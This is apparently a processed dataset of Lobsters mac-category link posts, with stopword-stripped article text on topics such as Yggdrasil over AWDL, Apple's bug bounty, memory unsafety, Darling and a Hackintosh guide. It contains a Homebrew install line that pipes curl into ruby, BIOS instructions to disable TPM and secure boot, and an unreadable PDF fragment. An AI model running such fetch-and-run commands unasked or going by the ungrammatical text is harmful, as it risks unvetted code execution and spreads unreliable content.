opened two device creating peering net result awdl peerings sudo yggdrasilctl getswitchpeers bytesrecvd bytessent coords endpoint ip port proto xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx tcp cement experiment actually disconnect two device connect different wifi network automatically peering interface still continues function test yggdrasil using new awdl link look fairly good device sat next id interval transfer bandwidth sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec sec mbytes mbitssec observation io test show link performance actually quite good routinely exceeds although two device able test yggdrasil node running awdl particular density due limited number mac hand one thing notice though awdl active wireless connection home wifi network reduce speed somewhat expected given wireless chipset hopping channel rather spending time single channel sadly able reproduce test using io testflight build yggdrasil io implement yggdrasil vpn service subject number probably reasonable restriction imposed o presumably exist stop vpn extension spying able create netservice within vpn extension service beacon advertised expected however able initiate kind connection interface chat engineer apple turn interface scoped use within vpn extension thus squashing hope dream able sprinkle kind magic onto io port yggdrasil feature request radar open apple hope may able change restriction future able get work macos quite awesome conclusion yggdrasil enable awdl default reduction wireless performance awdl active cause therefore enable awdl peering must add interface specifically multicastinterfaces configuration option yggdrasilconf however working support connecting mac together meshing automatically using awdl enable easily wish experiment love hear peering yggdrasil node using awdl performed extensive test performs realworld scenario join u matrix channel
163,Lobsters,mac,Apple macOS,The History of Clarus the Dogcow,https://512pixels.net/dogcow/,history clarus dogcow,upon time company real personality become member pixel clarus dogcow started typeface susan kare graphic designer working macintosh user interface element several font system athens chicago geneva monaco new york san francisco cairo game used font element printer dogcow documentation line printer technote http using macrecorder golden era dogcow mac iifx technote longgone icon garden via james thomson twopart history moof bräu disney dalmatian print studio talk clarus today apple swift documentation classic mac imessage sticker pack documentation,upon time company real personality apple today gleaming white wall corporate press release carefullytimed keynote longtime fan company remember time company far personality video become member pixel support project like receive exclusive content monthly newsletter enjoy advanced screening youtube video obvious sign like old sixcolor logo lesserknown relic apple old clarus dogcow one story started typeface every good hero good origin story clarus dogcow different design development original macintosh steve job harped importance typeface computer user interface job audited calligraphy course reed college dropping le insisted macintosh multiple proportionallyspace font launch help create typeface job turned susan kare graphic designer working macintosh user interface element kare created several font system given name worldclass city original font susan kare included athens slabserif typeface characterized bold clean line chicago heavy sanserif default system font system later appear ipod render well black white display chicago first font designed macintosh originally named elefont susan kare geneva sansserif font look familiar modern computer user due similarity ubiquitous typeface helvetica offshoot geneva named simple used apple newton o monaco monospaced sansserif typeface one oldworld mac font survive modern era mac o x snow leopard default font xcode new york inspired time new roman bitmap font default serif typeface original macintosh san francisco originally dubbed ransom san francisco designed mimic note created magazine clipping crazy person yikes one kare font however vasty different others cairo cairo original dingbat font would probably forgotten history like original macintosh font two thing game used font element character z position small creature named clarus printer dogcow documentation day original macintosh apple turned making printer laserwriter umbrella term used apple label line printer supporting software macos launched powered postscript application like pagemaker laserwriter printer helped propel apple forefront desktop publishing revolution starting late million page designed monochrome screen starting apple started shipping external monitor alongside macintosh ii world clarus enjoyed great prominence present page setup dialog box many version system printer software reminding user orientation print job would using apple still performing well point dark day still several year company sense humor apple employee mark red harlan took mac spring write technote nowdefunct developer technical support collection document harlan wanted clarify small animal found page setup dialog box title entry simply dogcow harlan opened document explaining dogcow dogcows nature dog cow special genetic hybrid rarely seen wild since dogcows two dimensional stand facing viewer edge avoid seen another common cause death falling cliff eating yikes scott zz zimmerman given credit coining term dogcow harlan gave name clarus also gave reader direction draw character animal name clarus word moof come well turn sound dogcow make http email zimmerman explained created sound remember one night apartment used cow sound sound effect cd recorded going oof using macrecorder eventually blended two sample sound site golden era dogcow early mid clarus height power dogcow spotted early version quicktime project created zimmerman time working developer technical support helping pixar macrenderman told render video took hour mac iifx clarus move multimedia outlined technote technote attempt document dogcow various sundry exploit recently world quicktime vr indeed might say dogcow gone vr case note look dogcow history peregrination explains technique creating quicktime vr object movie dogcow star could part next babe movie far behind stay tuned detail addition quicktime demo clarus showed across apple everything document render onscreen graphic mousepad shirt content part brandnew medium platform run growing branding empire clarus installed part longgone icon garden apple thennew campus infinite loop image via james thomson june apple developer allowed access twopart series history dogcow written friend mark harlan dogcow originally character cairo font used ship macintosh designed susan kare always interested critter ever since first saw laserwriter page setup option dialog sometime stint apple developer technical support dts group showed perfection human interface design one picture easy explain concept like inverted image larger print area otherwise would nearly impossible communicate interest became obsession one day talking scott zz zimmerman dialog suddenly thought animal supposed anyway since zz printing guy dts newton group favorite pastime bother endlessly anyway started pressing whether animal dog cow act desperation said ok called dogcow get office date october consider first use term noted since people including ginger told actually phrase coined ginger jernigan exdts rom software meeting apple print shop sometime shortly well could case nevertheless zz pressed common usage certainly first person ever heard use term moof bräu disney dalmatian print studio wwdc apple featured beer brewed california one example dubbed moof bräu photo bottle seen pulled old quicktime vr document end spectrum dalmatian print studio shipped apple magic collection software mac mid late included easter egg activated would add clarus user certificatemaking project learn easter egg many others talk aforementioned james thomson clarus today hard pin dogcow decline directly steve job clarus became harder harder spot return apple icon garden came mac o x used lessfun image page setup screen clarus made brief appearance o x address book hardly comeback apple may officially recognize glory dogcow clarus life clarus present apple swift documentation dogcow also present apple classic mac imessage sticker pack hardcore fan included chosen honor clarus permanent ink rumored dogcow still present specific way apple new hq cupertino fact video made subject includes story say visitor center ar model campus user remove roof small barn site reveal small version clarus visited apple store wwdc busted myth sadly barn house regular boring cow documentation additional reading rounded many document clarus happy exploring
164,Lobsters,mac,Apple macOS,Apple Confirms $1 Million Reward For Anyone Who Can Hack An iPhone,https://www.forbes.com/sites/thomasbrewster/2019/08/08/apple-confirms-1-million-reward-for-hackers-who-find-serious-iphone-vulnerabilities/,apple confirms million reward anyone hack iphone,reported monday million iphone hack,apple offering million anyone hack iphone chesnotgetty image apple massively increased amount offering hacker finding vulnerability iphones mac million far highest bug bounty offer major tech company fall program open researcher previously company inviteonly bug bounty program eligible receive reward forbes reported monday apple also launching mac bug bounty confirmed thursday also extending watchos apple tv operating system announcement came la vega black hat conference apple head security engineering ivan krstić gave talk io macos security forbes also revealed monday apple give bug bounty participant developer device let hacker dive io instance pause processor look happening data memory krstić confirmed io security research device program would application arrive next year million iphone hack full million go researcher find hack core zero click required iphone owner another given find network attack requiring user interaction also bonus hacker find weakness software released apple increasing reward face increasingly profitable private market hacker sell information government vast sum maor shwartz told forbes cost single exploit program us vulnerability typically take control computer phone fetch much millon exploit targeting whatsapp click required user instance sold government agency much though tool rare one two year sold pool around researcher focus highend hacking really hard research produce working exploit said previously company called zerodium vocal much pay researcher handing unknown government customer january secretive company announced offering million remote hack iphone krstić said bug bounty success date serious bug reported since launch
165,Lobsters,mac,Apple macOS,Prograph,https://medium.com/@noelrap/prograph-c3caa90b89e8,prograph,,someodd year ago graduate student spent two year building mac application using language called prographyou likely never heard iti want explain still kind obsessed iti spent lot intervening year explaining people great capable delivering lightning talk drop hat time past ten yearsprograph purely visual language called data flow language visual mean visual prograph code looked like flow charti get mechanic language moment want lead felt like work visual languagei felt greatpython reputation executable pseudo code prograph felt like executable flow charti found extremely intuitive much le prone syntax problem textual language development environment made might otherwise difficult task easy game like best runtime debug environment ever used also one best interface builder ever usedprograph hard write day reliable ide run anymore long enough ago many track internet percent sure source screen shot think tutorial macworld mid image vanished internet pulled talk backhere prograph workedan editor window new function method prograph consisted blue bar top pane another one bottom clicking top bar createed circle represents input value clicking bottom createed circle representing output value named could freely given labelscoding prograph involved drawing line output one function input anotherhere hello world function take input output string literal hello world sent input library method show display dialogthe developer environment provided menu listing type operation could insert function constant builtin primitive two option add screen drag connection move around saw fithere slightly elaborate example dotted background mean screenshot taken debug mode input methodthe octagon shape indicates instance creation case creating instance class text file think provided system note space identifier language need parse textif remembering correctly new instance passed method called get file leading slash mean instance method called whatever leftmost argument method evaluated dynamically runtime prograph latebinding ducktyped language similar semantics python second argument think list old mac system file type output get file passed open another instance method open file opened file passed read line read one line file line passed system method indicated think second line bottom rectangle called take second argument return true first argument contains secondby probably learned three thing visual nature prograph make kind syntax error basically impossiblethe visual flowchart syntax loveitorhateit people flip others hard time making say allowing space method variable name surprisingly high effect readability hard discus prograph code wordsa feature little le obvious unlike textual language order command happen depends data flow example command happen heading screen command dependent input output previous command two literal operation happen order allow executed dependency think version literally ran parallel language certainly set encourage parallel thinking different example show three different sort could happen orderthe weird shape object attribute getter language semantics handled using different shape rectangle callable thing object getter input object left output object input right output value object setter different custom shape global variablesother language semantics handled annotation either input output function could turn input dot ellipsis prograph would expect inflow dot list would automatically run function element list similarly make one output ellipsis prograph gather result run function list output map annotation would take output wind back top become input next loop inject enumerable type method pretty easy build top constructsthere also special annotation called injection would leave name function rectangle blank pas string name rectangle using injection input function string name would evaluated gave decent metaprogramming capability look think unneeded crossing line would considered bad style preferred style would keep list leftmost argument method injected conditional ifthen logic kind pain function could multiple clause essentially language construct provided move next clause boolean condition true test run code clause effectively bunch guard determining whether given block code run far away confusing construct language took get right never superclear involved little bit rethinking code depended heavily conditionals think special case ternary operator simple conditionals though prograph also interface builder along line visual basic could draw window widget assign event execute code code could compile regular mac executable could distributethe real best part though developer runtime environment developer environment interpreted running code went call function method exist environment would pause ask wanted start writing function open window done would pick execution run method writtenin debug mode prograph really took advantage dataflow basically sideeffect language could step execution time could see data point execution basically could mouse data circle could see even execution moved far beyond effectively got watch variable time free could also go back time undo execution step edit function called redo new code without exiting runtime screenshot showing mouse previous bit data even though code later flowso really repl runtime environment pretty powerful exactly remember could enter runtime arbitrary point whether execute program beginning remember developing nicethe overall effect language encouraged lot good coding practice small method conditionals breaking loop method good naming practice powerful runtime made editing debugging working code pretty easyelegant algorithm satisfyingly pretty spaghetti code looked like actual spaghettii loved itso happened amazing coding environment two set problem one relatively small user base hard share nontextual code discus code internet circa think somebody would eventually figured real limitation made somewhat hard shared library code repository really good solution nontextual change managementmore importantly maconly boutique commercial programming language reality hit hard mac user base dwindling tried convert window version could never get work well nobody window cared anyway mac version stagnated open source language happened big way kind commercial programming tool vendor got slammed tried refocus coldfusionstyle app server far tell went nowhere attempt create open source implementation cratered pretty fast think ever released anything attempt commercial mac o x version seems petered five year ago may surprised learn legal licensing related wrangling original owner open source team new mac team detail really know certainly help anything get releasedwhich shame unique fun programming tool good idea never seen executed quite well infinite amount time money could probably basis decent browserbased framework something
166,Lobsters,mac,Apple macOS,"Apple, let the iPad be the ultrathin device with limited ports not Macbooks",https://adamsimpson.net/writing/0-14,apple let ipad ultrathin device limited port macbooks,thinkpad quite nice popos linux distro john gruber apt comparison mac carry update lobster think looking apple desktop,type thinkpad recently switched lifetime using apple machine literally grew apple computer shoutout macintosh classic switched time new machine nt want using faulty keyboard next year caveat continue nt buying laptop would get imac imac pro would well apple desktop computer great place right machine work web developer technical director sparkbox range application need largely crossplatform dropbox slack google calendar code editor browser terminal email miss nt need imessage photo safari tweetbot sequel pro etc nt completely lost mind running window using quite nice popos linux distro got thinkpad latest revision macbook keyboard would still make decision today given unknown quality fixed keyboard nicety come switch user upgradeable ram open sodimm slot soldered motherboard feel like nice compromise course threw stick total user upgradeable ssd easily swap stock ssd samsung pro ssd faster apple ship current macbook pro amazon port usba port usbc port also full size hdmi sd card slot fullsize ethernet course bestinclass keyboard stink macos inferior trackpad stark difference current macbook pro thinkpad remind john gruber apt comparison io macos ipad new scene emphasis mine say io baggage baggage mac carry mac o x essential role io world serving platform complex resourceintensive task funny thing best slogan describe mac role one started year ago computer rest u apple apply hardware well let ipad ultrathin device limited port nt force set compromise professional laptop user like said apple desktop fantastic heck mac mini ram almost user serviceable thin machine compared macbook pro thick according lenovo official spec weighs macbook pro comparison thick weighs difference thinness worth access port user upgradeability longevity keyboard certainly nt think disappointed apple continues demonstrate care single feature desperately miss macos apple laptop hardware atrophied degree software alone nt worth update quite bit discussion happened lobster easy get hung port included think looking apple desktop instructive usba sd card included hdmi nice opinion see argument dropping none port would cause device become unbearably thick would add significant value convenience
167,Lobsters,mac,Apple macOS,Memory Unsafety in Apple's Operating Systems,https://langui.sh/2019/07/23/apple-memory-safety/,memory unsafety apple operating system,lazyfishbarrel memory unsafety care entirely fixed io mojave aka macos xnu macos bug v security architecture ian beer path io,lazyfishbarrel tweeting statistic proportion memory unsafety related vulnerability various software little year however twitter great medium dispensing information per release basis great deeper analysis rather talking single release aggregated total memory unsafetyrelated vulnerability statistic apple two flagship operating system io macos memory unsafety care memory unsafety property programming language allows creation bug security vulnerability related memory access language like c c memory unsafe allow memory violation use uninitialized memory double free buffer overflow use free etc avoid programmer must perfectly allocate write read deallocate memory else serious vulnerability easily occur bug especially frustrating represent class issue entirely fixed moving language suffer limitation io io released september subsequently total feature point release unlike macos io series several small bugfix release correct security issue marked na bugscves remain present list total cve count memory unsafety bug percentage release na na na na na na na na na across entirety io apple fixed cf memory unsafety vulnerability mojave aka macos apple released macos mojave september subsequently issued point release across entirety mojave apple fixed cf memory unsafety vulnerability xnu macos statistic code ship macos io including kernel counted kernel kernel extension issue macos slicing number way find vulnerability whopping attributable directly memory unsafety bug v security architecture blackhat usa ian beer gave talk called path io discus apple approach security design contends security system design making promise poor software development practises keep go state given sufficient bug density security design irrelevant see statistic writing software memory unsafe language like c c providing least two third bug density additionally although conducted specific analysis effect relatively rare logical vulnerability cause code execution exception jit bug common outcome memory corruption thus memory unsafety causing majority security bug bug also likely severe switching language done overnight incremental conversion memory safe world need top priority improving memory safe toolchains training programmer new idiom phasing legacy memory unsafe codebases luxury necessity
168,Lobsters,mac,Apple macOS,Panic's Nova Private Beta - The next editor from Panic,https://panic.com/nova/,panic nova private beta next editor panic,process elist look like,make great software take time care start scratch remake existing app take even next text editor followup coda could nt add feature call day change dramatically catch thing today consider web development tomorrow process applicant chosen random lottery pool people applied currently looking additional beta tester time please sign elist first hear released following round focused beta testing make sure nova work well everyone keep page updated extension developer select coda user general private beta public release look like new screenshots
169,Lobsters,mac,Apple macOS,Darling Progress Report Q2 2019,http://blog.darlinghq.org/2019/07/darling-progress-report-q2-2019.html,darling progress report,summary progress darling community discord http darling core james urquhart kamillys new website sergey project website appkit kamillys nested framework andrew framework nesting v reexporting foundation curioustommy kamillys corefoundation improved tommy going forward open issue github wiki,summary progress excited say april june saw community involvement ever many pull request submitted spanned bug fix low level assembly higher level module appkit framework thanks everyone contribution hope level engagement continue darling community discord relied solely github issue long time become apparent platform people ask general question share knowledge coordinate effort necessary official discord server open everybody join order discus anything darling related invite link http feel free join invite anyone may interested darling core community submitted pull request ever received james urquhart pull request gave u stub many framework including drawsprocket agl carbon coreservices applicationservices wow list thank james james also fixed low level bug system call large number argument would nt work properly application finally fixed problem darling using clocksleep instead clocknanosleep bug stat system call commits sent kamillys gave u stub addressbook carbon framework new website sergey remade project website using hugo new website look modern adapts mobile device refresh look snazzy frequently asked question section site perfectly placed answer commonly sought information whole page right balance content without overwhelming viewer technical detail new site also highlight key feature goal darling including fast free compatible easy use native appkit continued improvement seen implementation appkit sergey squashed bug including crashing spelling engine present pointer wrong printing format got pasteboard work appkit ctrlcctrlv away even pretend command want github user kamillys also submitted pr gave appkit stub nsapplication nsworkspace appkit also also reexports applicationservices solving crash due undefined symbol program loaded nested framework framework macos appear one framework hood made subframeworks usually reexported linked appears one big framework build system nt support nested framework june andrew added support system framework accelerate file structure macos accomplished using cmake magic carefully replicating structure system framework framework nesting v reexporting reexporting dynamic library present also containing symbol library framework reexporting symbol typically function constant class link appkit without linking foundation use foundation symbol nested framework one framework placed inside case larger framework broken subframeworks like coreservices applicationservices need parent framework reexport subframeworks order appear one framework another use case nesting framework framework relies supporting library meant used framework like keeping private case parent framework would nt reexport would instead link child framework foundation good amount attention received foundation time nskeyedarchivernskeyedunarchiver many bug fix improvement submitted curioustommy stability area important nskeyedarchiver used serialize object extensively almost every cocoa application addition improvement tommy gave foundation symbol nsscriptclassdefinition category nsobject fixed issue macro nsobjcruntimeh stub also added kamillys nsscriptclassdescription nscallbacks function foundation missing change improve general compatibility name implies foundation fundamental relied many library application corefoundation error handling nsset improved tommy better checking parameter particularly someone try insert nil object set nt supposed possible possible thanks tommy going forward strong community involvement always exciting motivating received lot feedback pull request question way contribute learn join discord linked top post first trying help open source project may seem unclear help none open issue github jump discord perfect place ask start wiki also useful contains build instruction workarounds known build problem also nice see community step fix specific bug anticipated last progress report release macos coming month drop support application darling plan continue supporting application long time gui support improves strong option application stop working due lack capability see month darling project
170,Lobsters,mac,Apple macOS,The Legion Parallel Programming System,https://legion.stanford.edu/,legion parallel programming system,legion lanl nvidia research slac stanford office advanced scientific computing research national nuclear security administration advanced simulation computing program exact combustion codesign center legion contributor,legion datacentric parallel programming system writing portable high performance program targeted distributed heterogeneous architecture legion present abstraction allow programmer describe property program data eg independence locality making legion programming system aware structure program data automate many tedious task programmer currently face including correctly extracting task datalevel parallelism moving data around complex memory hierarchy novel mapping interface provides explicit programmer controlled placement data memory hierarchy assignment task processor way orthogonal correctness thereby enabling easy porting tuning legion application new architecture learn legion legion legion developed open source project major contribution lanl nvidia research slac stanford research supported exascale computing project collaborative effort two u department energy organization office science national nuclear security administration responsible planning preparation capable exascale ecosystem including software application hardware advanced system engineering early testbed platform support nation exascale computing imperative additional support provided lanl slac via department energy office advanced scientific computing research nvidia lanl stanford u department energy national nuclear security administration advanced simulation computing program previous support legion included u department energy exact combustion codesign center scientific data management analysis visualization sdmav program darpa army high performance computing research center nvidia grant olcf nersc swiss national supercomputing centre cscs legion contributor
171,Lobsters,mac,Apple macOS,A week of pkgsrc #13,https://www.geeklan.co.uk/?p=2384,week pkgsrc,received report mailbox openssl darwin fix macports gnu bison making use version pkgsrc instead resolved issue sevanmitedu viva powerpc plug,lead release picked ball testing o x tiger take month mac mini attempt bulk build entire pkgsrc tree compiler usually taking day without success reduce turnaround time switched attempting small subset package quicker turnaround using metapkgsbulklarge couple day compiling received report mailbox showing breakage key package openssl securityopenssl issue regression upstream resolved bringing package date breakage due wnoarraybounds passed compiler ancient version gcc tiger supporting resulting hard error unrecognized command line option wnoarraybounds error use buildlinktransformdarwin allowed option removed dynamically fly confined applied build darwin securitylibgpgerror needed definition make use unsetenv return integer unsetenv called inside statement unable test result tiger still used old implementation default return void result error error void value ignored ought building fix came macports many breakage due lack support strnlen tiger apple introduced support function lion workaround pkgtoolslibnbcompat includes implementation used place package specify strnlen requirement using usefeatures o marked missing feature using opsysmissingfeatures issue readline included tiger workaround locally switched using gnu readline find tiger lack support parameter exec ability install python egg module currently broken worked around locally progress bulk build next step possibly make pkgsrc aware find tool substitute legacy version version sysutilscoreutils perhaps broken due ageing version gnu bison called lacked support feature gen srcastparsercc usrbinbison option defines nt allow argument usage usrbinbison dhklntvyv b fileprefix outfile p nameprefix debug defines fixedoutputfiles nolines verbose version help yacc noparser tokentable fileprefixprefix nameprefixprefix outputoutfile grammarfile making use version pkgsrc instead resolved issue specifying bison usetools advancement language development new standard defined pkgsrc grew support specifying version c c language standard package may require eg turn pass relevant standard compiler using std option compiler used support standard specified test gnu configure determine compiler language support fail resulting cryptic configure error c preprocessor libcpp fails sanity check cpp usrbin tiger local workaround commented block pkgsrcmkcompilermk standard set sure whether knob ignore setting stand standard worth move forward enforcing use new external toolchain change bulk build result went package resulting package bootstrap kit sevanmitedu next step address support find pkgsrc tool infrastructure remove setting mode mac bootstrap mode tiger really support thanks viva powerpc plug glimpse sevanmitedu run currently
172,Lobsters,mac,Apple macOS,6 mac apps that fit everyone,https://sobolevn.me/2019/07/6-best-mac-apps,mac apps fit everyone,tldr dotfiles command line productivity using better cli sindresorhus done openinterminallite spectacle wonderful repo use lookandfeel online,often see list awesome apps going use one fit one different list contains simple yet powerful productivity booster totally fit everyone tldr list mac apps using found dotfiles rest setup previous ontopic article command line productivity using better cli new project sindresorhus simple yet amazing reason traditional mac clock show date calendar someone asks date today open calendar app seriously app solves improved clock calendar timezones new app announced might also want hide original clock status bar done next app allows highlighting currently focused window sound like much feel app amazing work great light dark background watch video look awesome traveling around file finder might need open current folder inside terminal draganddrop terminal many user like use openinterminallite add new icon finder open anything inside terminal editor single click spectacle allows using keyboard shortcut reorganize window desktop lifesaver people lot opened window complex workflow want ide opened next browser two key press want terminal sorted two key press simple whole set different quick preview plugins wonderful repo amazing thing quick preview like highlight code allows view image size highlight prettyprints transforms json really mention flux everyone already one installed flux turn monitor color warm night allows eye brain rest use try demo lookandfeel online apps use problem solve provide like favorite apps dotfiles comment
173,Lobsters,mac,Apple macOS,Mea Culpa,http://www.folklore.org/StoryView.py?story=Mea_Culpa.txt,mea culpa,,almost everyone involved design original macintosh proud work project individually collectively nt mean nt also embarrassed mistake made worthwhile consider apologize worst decision personally responsible well major fault system software product whole worst blunder perpetrated memory manager bud tribble adapted lisa intrasegment memory manager macintosh see hungarian needed add feature one locked attribute associated relocatable memory block temporarily prevented block moved another enhancement purgable attribute told memory manager could release block needed memory getting full big mistake chose locate bit controlled attribute decided put bit controlling locked purgable attribute highorder bit master pointer pointer current address memory block nt used anything else bit address bus allowing megabyte addressable memory highorder bit address used processor high bit word efficient one test another reason thought efficient locate flag course foolish count unused address bit stay way long became problem macintosh transitioned processor introduction macintosh ii full thirtytwo bit address bus memory manager could longer get away using highorder master pointer bit flag nt hard jerome coonen convert memory manager keep flag block header instead master pointer first place practice manipulating directly crept third party application even though nt supposed took another year identify eradicate transgression upgrade macintosh software base bit clean full address space could used paid direct price second worst mistake use fixed low memory address toolbox globals apple ii kept important system globals low memory included special short addressing mode made accessing address first memory efficient motivated u use low memory various globals may acceptable system globals clearly mistake toolbox since precluded u running one application time since application required copy toolbox globals nt matter much first ram barely enough memory run single application time macintosh released september started become issue october left apple work realized could solve problem swapping applicationdependent low memory location performed context switch day wrote core mac first multitasking environment called switcher using low memory swapping technique kept multiple program resident memory switched nifty scrolling effect using low memory like ended making context switching millisecond slower made harder eventually use memory management unit nt turn devastating thought wanted macintosh relatively simple system architecture could perform well limited hardware resource perhaps went little far decided could live without memory management unit right decision expense associated hardware also decided eliminate distinction user system code running everything supervisor mode empowered application simplified system poor choice long run made harder control software base system evolved even bill atkinson made occasional error worst mistake using signed integer size various quickdraw data structure like region picture limited maximum size region picture kilobyte became significant limitation year later memory size grew bruce horn resource manager suffered similar problem using bit offset limiting size resource file unnecessarily biggest problem macintosh hardware pretty obvious limited expandability problem nt really technical much philosophical wanted eliminate inevitable complexity consequence hardware expandability user developer every macintosh identical valid point view even somewhat courageous practical thing still changing fast computer industry work driven relentless tide moore law burrell try sneak expandability design see diagnostic port partially successful limited hardware expandability exacerbates flaw design since nt flexibility thirdparties easily correct one biggest mistake made first mac enough support hard drive first file system used simple data structure nt scale well large drive fact suggested u bill gate july nt way get bit box rate hard disk required defense hard u consider adding hard disk macintosh one last differentiator lisa three time expensive lack hardware flexibility made difficult third party jump breach although anyway broader perspective think many mistake came lack understanding exactly thought making great product reincarnating apple ii actually creating first long line compatible computer would persist decade although latter would nt happened nt succeed former perhaps design would given future priority present understood long would last
174,Lobsters,mac,Apple macOS,Personal do(n)tfiles - managing dotfiles with (just) git,https://github.com/tomekw/dontfiles,personal n tfiles managing dotfiles git,join github today sign file permalink dontfiles install new machine usage setup repository http topic resource reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time dontfiles install new machine install homebrew xcodeselect install usrbinruby e curl fssl http rawgithubusercontentcomhomebrewinstallmasterinstall install git clone repository git clone bare git githubcom tomekwdontfilesgit dontfiles pull change git worktree home gitdir homedontfiles checkout f master run installation script homebindontfilesinstallsh usage use dfgit git setup repository git init bare dontfiles see http personal n tfiles topic resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
175,Lobsters,mac,Apple macOS,Dell E7440 Hackintosh,https://github.com/ameeno/Dell-E7440-Hackintosh,dell hackintosh,o already got bootable clover efi installed throttling problem common issue http wwwyoutubecomwatch additional guide hackintosh guide overview note guide information note creating usb installer instead important miss installing macos mojave postinstallation one key hidpi guide come,branch dell latitude bios system following spec intel cpu ram ssd samsung ssd intel gpu broadcom ac bluetooth card also known work everything o use high sierra mojave tested working great use simply download repository zip file extract efi partition efi folder already got bootable clover efi installed otherwise must set laptop boot clover bios link guide future btw inside kext copytole folder copy kexts libraryextensions hackintosh install completed next inside audio folder alcfix zip file unzip hackintosh desktop anywhere like terminal run sudo installsh inside folder fix hd audio verb sudo installsh inside alcfix folder terminal run clean rebuild script main folder inside repos folder following command chmod x enjoy hackintosh source osxlatitude research lilu friend throttling problem common issue common issue dell laptop suffer throttling problem restricted locked cpu really hackintosh related issue laptop hardware issue quite common personally suffered user repository fortunately fix rather simple requires removing one screw keyboard pointless screw nt seem anything cause cpu temperature sensor lock cpu thanks user posted helpful youtube video fix sensor http wwwyoutubecomwatch involve taking laptop apart slightly get underneath keyboard since thinking hackintoshing laptop first place nt think taking mini screwdriver machine minute scare rest guide additional guide hackintosh guide overview guide reference guide credit guide given respective owner assumed decent understanding hackintosh macos environment well basic computer task guide different information needed get macos mojave working latitude special thanks guide configure hackintosh install also special thanks github guide create macos installer recovery used guide easier write laptop especially building osx installer bit note responsible harm cause device guide provided asis step taken done risk guide information work power managementsleep brightness control battery information audio internal speaker headphone jack usb port graphic acceleration facetimeimessage trackpointtouchpad pretty much everything except listed minidp vga minidp hdmi dvi hdmi hdmi hdmi dvi wifi bluetooth tested ac card nt work right nothing note currently working fix item listed use guide information find something work please submit issue request work fix creating usb installer since nt access legitimate mac needed able create vanilla macos installer guide many others used inform user create usb installer macos distro niresh may work fine creating vanilla macos installer distro shady come preloaded bunch extra junk needed overall highly advised used follow step figure create real macos mojave vanilla installer without access real mac follow step guide get part installing clover bootloader follow step configuring kexts etc instead important miss copy clover bootloader kexts file downloaded another usb drive one burning installer external hard drive need access later copy clover boot folder downloaded repository onto usb drive well copy clover folder downloaded repository efi simply copy whole folder configplist everything else already configured help configuring clover usb installer original guide linked step help make sure install kexts clover folder repo onto clover usb guarantee work properly ready continue next topic installing macos mojave installing macos mojave followed guide usb drive ready go reboot machine reboot enter bios change setting hitting dell boot screen choosing bios setup bios make sure change following setting disable security chip disable anti theft module disable tpm basically disable security feature make sure secure boot feature like feature affect macos sleep choose uefi legacy boot reboot macos press select usb drive inside clover boot macos install onto hard drive using ethernetwifi recovery recommend using ssd done reboot computer let sit mine rebooted time go final installation procedure see region selection screen good proceed create user account everything else sign icloud account asks connect network select option say connect press continue connect later booted plug usb drive external hard drive copied clover file step previous section install clover bootloader following step using setting except time install onto internal hard drive mojave installation recommend checking box say install clover configurator well come handy later need copy clover configuration usb hard drive mojave simply copy clover folder efi folder repo efi partition clover mounted install postinstallation inside cloverkextothercopytole folder several kexts copy libraryextensions folder hackintosh recommend use clover configurator setup serial number mlbuuid make unique done easily using clover configurator finally run included file repair permission fix system hibernation fhd screen full hd screen stock modded recommended install one key hidpi mimic retina display feature many apple newer laptop come setting apple service facetime imessage etc highly recommend following guide get feature working worked first try super straight forward compared guide seen past come
176,Lobsters,mac,Apple macOS,"MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link",https://www.usenix.org/system/files/sec19fall_stute_prepub.pdf,mitm do tracking attack io macos apple wireless direct link,,obj length filter flatedecode stream xڭz nγ u
177,Lobsters,mac,Apple macOS,The state of switching to Windows from Mac in 2019,https://char.gd/blog/2019/the-state-of-switching-to-windows-from-mac-in-2019,state switching window mac,made jump macos window hardware flaw poorlydesigned keyboard continues read recommendation macbook replacement new window list major change window two year free impressive even next window update due may ship great stuff good bash window maturing quickly rarely talked wsl executable fluent terminal touchscreen bust hello authentication window update nt slow anymore microsoft made updating le painful window nt give keyboard layout typography layout window great hardware choice like gorgeous oledequipped hp laptop zerothought app update bad app story remains problematic procreate wsl performance unpredictable hundred developer chiming issue ugly microsoft design language mess taskbar weirdly broken still good time jump check laptop guide,two year ago made jump macos window despite longtime apple fan honest nt easy switch first time went become clear right choice state apple macos device disaster company refreshed macbook air year request stunt hardware worse slowly seeing higherend pro hardware refreshed mac mini probably exciting development stream hardware flaw poorlydesigned keyboard continues two year since switch worked find absolute best laptop money could buy trying compare anything might great macbook alternative read recommendation macbook replacement thought time revisit window state thing two year whether plan sticking around new window window might appear le refined macos really impressed switching rapidly microsoft releasing major update platform refinement company adding almost o sorely need company shipping quickly list major change window two year free impressive continued rollout beautiful fluent design system across platform albeit slowly new systemwide light theme first timea seamlessly synchronized cloud clipboard mobile desktopdeep mobile integration android via phone instantly grab image reply sm oswide dark mode including window explorer beyondsnip sketch tool natively enable quick screenshots annotation digital ink window key synchronized timeline computer phone seamless handoff historic taskspictureinpicture across o browsersnative yubikey support oslevel integrated web browser like chromea native emoji keyboard kaomoji symbol available text fieldmassive improvement wslbash window transformed firstclass unix alternative big stuff much tweaked improved feel like daily basis even next window update due may ship great stuff good bash window maturing quickly still really satisfied wslbash setup really come lot people assume able function true full linux reached point fully capable webdevelopment workflow example first jumped wsl bit tinkering required make work perfectly tool might bit broken unsupported thing like grunt watcher last year creator update issue nt think promoted well enough got full file watcher support native symlinking ability use vagrant via bash support opening bash file window application directly much much one powerful shift wsl environment fully disposable even live alongside multiple linux distribution living together happy family broke bash setup duplicate spin fresh copy mess around rather needing blow away whole machine new rarely talked wsl executable make switching feel like genuine magic able make portable machine exporting fantastic container really change way think bash setup offer ton potential future hotswappable coding setup needed reached point entire native php workflow work perfectly wsl native window apps including debugging code xdebug breakpointing spinning vagrant really surprised community embrace wsl quickly come start supporting tooling window via channel project like vessel spin instant laravel environment docker support wsl specifically along many tool use daily basis great sign community care well wsl genuinely exciting continues reason jump across developer along new idea like chocolatey package manager replace brew project like boxcutter automate setting environment great time jump also terminal emulator finally give bash window justice fluent terminal touchscreen bust device touchscreen find lack one macbook keep touching people screen instinct say touch laptop much natural using mouse lot time make great experience couch pawing netflix hello authentication awesome love window homebaked 